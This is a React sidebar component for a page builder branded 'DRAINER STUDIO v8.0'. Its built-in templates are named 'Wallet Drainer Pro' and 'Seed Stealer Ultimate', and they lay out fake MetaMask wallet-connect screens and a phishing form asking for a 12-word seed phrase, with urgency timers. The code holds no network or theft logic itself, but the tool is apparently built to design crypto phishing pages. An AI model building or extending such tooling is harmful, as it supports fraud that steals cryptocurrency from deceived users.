import { useState } from 'react';
import { Element, Template } from '../types/Element';
import { Button } from '../components/ui/button';
import { Input } from '../components/ui/input';
import { Label } from '../components/ui/label';
import { Slider } from '../components/ui/slider';
import { 
  MousePointer, 
  Type, 
  Image, 
  Clock, 
  BarChart3, 
  QrCode, 
  Users, 
  Sliders, 
  ToggleLeft,
  Upload,
  Grid3x3,
  Undo,
  Redo,
  Download,
  Layers,
  Zap,
  FileText,
  Shield
} from 'lucide-react';

interface SidebarProps {
  elements: Element[];
  selectedId: string | null;
  zoom: number;
  showGrid: boolean;
  onDragStart: (type: Element['type']) => void;
  onZoomChange: (zoom: number) => void;
  onToggleGrid: () => void;
  onUndo: () => void;
  onRedo: () => void;
  onExport: () => void;
  onBackgroundUpload: (e: React.ChangeEvent<HTMLInputElement>) => void;
  onHTMLUpload: (e: React.ChangeEvent<HTMLInputElement>) => void;
  onTemplateLoad: (template: Template) => void;
  onElementSelect: (id: string) => void;
  canUndo: boolean;
  canRedo: boolean;
}

const elementTypes: { type: Element['type']; icon: React.ReactNode; label: string }[] = [
  { type: 'button', icon: <MousePointer className="w-4 h-4" />, label: 'Button' },
  { type: 'input', icon: <Type className="w-4 h-4" />, label: 'Input' },
  { type: 'text', icon: <Type className="w-4 h-4" />, label: 'Text' },
  { type: 'image', icon: <Image className="w-4 h-4" />, label: 'Image' },
  { type: 'timer', icon: <Clock className="w-4 h-4" />, label: 'Timer' },
  { type: 'progress', icon: <BarChart3 className="w-4 h-4" />, label: 'Progress' },
  { type: 'qr', icon: <QrCode className="w-4 h-4" />, label: 'QR Code' },
  { type: 'social', icon: <Users className="w-4 h-4" />, label: 'Social' },
  { type: 'slider', icon: <Sliders className="w-4 h-4" />, label: 'Slider' },
  { type: 'toggle', icon: <ToggleLeft className="w-4 h-4" />, label: 'Toggle' },
];

const templates: Template[] = [
  {
    name: 'Wallet Drainer Pro',
    elements: [
      {
        type: 'text',
        x: 400,
        y: 100,
        width: 400,
        height: 60,
        text: 'CONNECT WALLET',
        color: '#ffffff',
        backgroundColor: 'transparent',
        rotation: 0,
        opacity: 1,
        borderRadius: 0,
        fontSize: 36,
        fontWeight: '900',
        borderStyle: 'none',
        borderColor: '#000000',
        borderWidth: 0,
        zIndex: 1,
      },
      {
        type: 'button',
        x: 450,
        y: 250,
        width: 300,
        height: 60,
        text: 'METAMASK',
        color: '#000000',
        backgroundColor: '#f6851b',
        rotation: 0,
        opacity: 1,
        borderRadius: 8,
        fontSize: 18,
        fontWeight: 'bold',
        borderStyle: 'none',
        borderColor: '#000000',
        borderWidth: 0,
        zIndex: 2,
      },
      {
        type: 'timer',
        x: 550,
        y: 400,
        width: 100,
        height: 40,
        text: '⏱️ 02:00',
        color: '#ffffff',
        backgroundColor: 'transparent',
        rotation: 0,
        opacity: 1,
        borderRadius: 0,
        fontSize: 20,
        fontWeight: '900',
        borderStyle: 'none',
        borderColor: '#000000',
        borderWidth: 0,
        zIndex: 3,
      },
    ],
  },
  {
    name: 'Seed Stealer Ultimate',
    elements: [
      {
        type: 'text',
        x: 350,
        y: 80,
        width: 500,
        height: 80,
        text: 'RECOVER YOUR SEED PHRASE',
        color: '#ffffff',
        backgroundColor: 'transparent',
        rotation: 0,
        opacity: 1,
        borderRadius: 0,
        fontSize: 32,
        fontWeight: '900',
        borderStyle: 'none',
        borderColor: '#000000',
        borderWidth: 0,
        zIndex: 1,
      },
      {
        type: 'input',
        x: 350,
        y: 200,
        width: 500,
        height: 50,
        text: 'Enter 12-word seed phrase...',
        color: '#ffffff',
        backgroundColor: 'rgba(0, 0, 0, 0.5)',
        rotation: 0,
        opacity: 1,
        borderRadius: 8,
        fontSize: 16,
        fontWeight: 'normal',
        borderStyle: 'solid',
        borderColor: '#00ffff',
        borderWidth: 2,
        zIndex: 2,
      },
      {
        type: 'button',
        x: 450,
        y: 300,
        width: 300,
        height: 60,
        text: 'RECOVER NOW',
        color: '#ffffff',
        backgroundColor: 'linear-gradient(45deg, #00ffff, #ff00ff)',
        rotation: 0,
        opacity: 1,
        borderRadius: 12,
        fontSize: 20,
        fontWeight: 'bold',
        borderStyle: 'none',
        borderColor: '#000000',
        borderWidth: 0,
        zIndex: 3,
      },
    ],
  },
];

export const Sidebar = ({
  elements,
  selectedId,
  zoom,
  showGrid,
  onDragStart,
  onZoomChange,
  onToggleGrid,
  onUndo,
  onRedo,
  onExport,
  onBackgroundUpload,
  onHTMLUpload,
  onTemplateLoad,
  onElementSelect,
  canUndo,
  canRedo,
}: SidebarProps) => {
  const [activeTab, setActiveTab] = useState<'elements' | 'templates' | 'layers' | 'controls'>('elements');

  return (
    <div className="w-80 bg-gray-900 border-r border-cyan-500/30 flex flex-col">
      <div className="p-4 border-b border-cyan-500/30">
        <h1 className="text-xl font-black text-white leading-tight">
          DRAINER STUDIO v8.0
        </h1>
        <p className="text-white text-xs mt-1 font-bold">ULTIMATE EDITION</p>
      </div>

      <div className="flex border-b border-cyan-500/30">
        {[
          { id: 'elements', label: 'Elements', icon: <Zap className="w-3 h-3" /> },
          { id: 'templates', label: 'Templates', icon: <Layers className="w-3 h-3" /> },
          { id: 'layers', label: 'Layers', icon: <Layers className="w-3 h-3" /> },
          { id: 'controls', label: 'Controls', icon: <Sliders className="w-3 h-3" /> },
        ].map((tab) => (
          <button
            key={tab.id}
            onClick={() => setActiveTab(tab.id as any)}
            className={`flex-1 py-3 px-2 text-xs font-bold uppercase tracking-wider transition-all flex items-center justify-center gap-1 ${
              activeTab === tab.id
                ? 'bg-cyan-500/20 text-white border-b-2 border-cyan-400'
                : 'text-white hover:text-gray-200'
            }`}
          >
            {tab.icon}
            {tab.label}
          </button>
        ))}
      </div>

      <div className="flex-1 overflow-y-auto p-4">
        {activeTab === 'elements' && (
          <div className="space-y-2">
            <h3 className="text-white font-bold text-xs uppercase tracking-wider mb-3">
              Drag Elements to Canvas
            </h3>
            {elementTypes.map(({ type, icon, label }) => (
              <div
                key={type}
                draggable
                onDragStart={() => onDragStart(type)}
                className="bg-gray-800 border border-cyan-500/30 rounded-lg p-3 cursor-move hover:bg-cyan-500/10 hover:border-cyan-500/50 transition-all group"
              >
                <div className="flex items-center gap-3">
                  <div className="text-white group-hover:text-gray-200 transition-colors">
                    {icon}
                  </div>
                  <span className="text-white font-medium">{label}</span>
                </div>
              </div>
            ))}
          </div>
        )}

        {activeTab === 'templates' && (
          <div className="space-y-2">
            <h3 className="text-white font-bold text-xs uppercase tracking-wider mb-3">
              Quick Start Templates
            </h3>
            {templates.map((template) => (
              <button
                key={template.name}
                onClick={() => onTemplateLoad(template)}
                className="w-full bg-gradient-to-r from-purple-900/50 to-cyan-900/50 border border-cyan-500/30 rounded-lg p-4 hover:from-purple-900/70 hover:to-cyan-900/70 transition-all text-left"
              >
                <div className="text-white font-bold">{template.name}</div>
                <div className="text-white text-xs mt-1">
                  {template.elements.length} elements
                </div>
              </button>
            ))}
          </div>
        )}

        {activeTab === 'layers' && (
          <div className="space-y-2">
            <h3 className="text-white font-bold text-xs uppercase tracking-wider mb-3">
              Element Layers
            </h3>
            {elements.length === 0 ? (
              <div className="text-white text-sm">No elements yet</div>
            ) : (
              [...elements].reverse().map((element) => (
                <button
                  key={element.id}
                  onClick={() => onElementSelect(element.id)}
                  className={`w-full bg-gray-800 border rounded-lg p-3 text-left transition-all ${
                    selectedId === element.id
                      ? 'border-cyan-400 bg-cyan-500/10'
                      : 'border-cyan-500/30 hover:border-cyan-500/50'
                  }`}
                >
                  <div className="flex items-center justify-between">
                    <span className="text-white font-medium capitalize">
                      {element.type}
                    </span>
                    <span className="text-white text-xs">
                      {Math.round(element.x)}, {Math.round(element.y)}
                    </span>
                  </div>
                  <div className="text-white text-xs mt-1 truncate">
                    {element.text}
                  </div>
                </button>
              ))
            )}
          </div>
        )}

        {activeTab === 'controls' && (
          <div className="space-y-4">
            <div>
              <Label className="text-white text-xs uppercase tracking-wider font-bold">Zoom</Label>
              <div className="flex items-center gap-2 mt-2">
                <Slider
                  value={[zoom]}
                  onValueChange={([value]) => onZoomChange(value)}
                  max={2}
                  min={0.5}
                  step={0.1}
                  className="flex-1"
                />
                <span className="text-white text-sm w-12 font-bold">{Math.round(zoom * 100)}%</span>
              </div>
            </div>

            <div className="space-y-2">
              <button
                onClick={onToggleGrid}
                className={`w-full py-2 px-4 rounded-lg font-medium text-sm transition-all ${
                  showGrid
                    ? 'bg-cyan-500/20 text-white border border-cyan-500/50'
                    : 'bg-gray-800 text-white border border-gray-700 hover:border-cyan-500/30'
                }`}
              >
                <Grid3x3 className="inline w-4 h-4 mr-2" />
                {showGrid ? 'Hide Grid' : 'Show Grid'}
              </button>

              <div className="flex gap-2">
                <button
                  onClick={onUndo}
                  disabled={!canUndo}
                  className="flex-1 py-2 px-4 bg-gray-800 text-white rounded-lg font-medium text-sm transition-all hover:bg-gray-700 disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  <Undo className="inline w-4 h-4 mr-2" />
                  Undo
                </button>
                <button
                  onClick={onRedo}
                  disabled={!canRedo}
                  className="flex-1 py-2 px-4 bg-gray-800 text-white rounded-lg font-medium text-sm transition-all hover:bg-gray-700 disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  <Redo className="inline w-4 h-4 mr-2" />
                  Redo
                </button>
              </div>

              <div className="bg-yellow-900/20 border border-yellow-500/30 rounded-lg p-3">
                <div className="flex items-center gap-2 mb-2">
                  <Shield className="w-4 h-4 text-yellow-400" />
                  <span className="text-yellow-400 font-bold text-xs">DESIGN-ONLY MODE</span>
                </div>
                <p className="text-white text-xs">
                  HTML import preserves visual styling only. All functionality is disabled for safety.
                </p>
              </div>

              <div>
                <Label className="text-white text-xs uppercase tracking-wider font-bold block mb-2">
                  Upload HTML File (Visual Only)
                </Label>
                <input
                  type="file"
                  accept=".html,.htm"
                  onChange={onHTMLUpload}
                  className="hidden"
                  id="html-upload"
                />
                <label
                  htmlFor="html-upload"
                  className="block w-full py-2 px-4 bg-gray-800 text-white rounded-lg font-medium text-sm transition-all hover:bg-gray-700 cursor-pointer text-center"
                >
                  <FileText className="inline w-4 h-4 mr-2" />
                  Import HTML Design
                </label>
              </div>

              <div>
                <Label className="text-white text-xs uppercase tracking-wider font-bold block mb-2">
                  Background Image
                </Label>
                <input
                  type="file"
                  accept="image/*"
                  onChange={onBackgroundUpload}
                  className="hidden"
                  id="bg-upload"
                />
                <label
                  htmlFor="bg-upload"
                  className="block w-full py-2 px-4 bg-gray-800 text-white rounded-lg font-medium text-sm transition-all hover:bg-gray-700 cursor-pointer text-center"
                >
                  <Upload className="inline w-4 h-4 mr-2" />
                  Upload Background
                </label>
              </div>

              <button
                onClick={onExport}
                className="w-full py-3 px-4 bg-gradient-to-r from-cyan-500 to-purple-600 text-white rounded-lg font-bold text-sm uppercase tracking-wider transition-all hover:from-cyan-600 hover:to-purple-700 shadow-lg hover:shadow-cyan-500/50"
              >
                <Download className="inline w-4 h-4 mr-2" />
                Export Production
              </button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};